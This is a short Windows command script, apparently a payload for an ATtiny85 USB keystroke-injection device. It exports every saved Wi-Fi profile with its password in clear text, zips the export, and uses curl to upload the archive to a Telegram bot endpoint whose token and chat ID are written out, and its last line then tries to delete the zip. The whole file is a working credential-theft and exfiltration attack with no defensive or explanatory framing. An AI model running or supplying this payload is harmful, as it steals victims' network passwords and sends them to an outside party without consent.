md %USERPROFILE%\attiny85-netsh-profiles
netsh wlan export profile key=clear folder=%USERPROFILE%\attiny85-netsh-profiles
tar -a -c -f %USERPROFILE%\attiny85-netsh-profiles.zip %USERPROFILE%\attiny85-netsh-profiles
curl -F "document=@%USERPROFILE%\attiny85-netsh-profiles.zip" -F "chat_id=479116709" "https://api.telegram.org/bot834877608:AAHPkiA0T3G_onBlrJbuGxtaHEh6bKTl_aM/sendDocument"
rd /s /q %USERPROFILE%\attiny85-netsh-profiles.zip
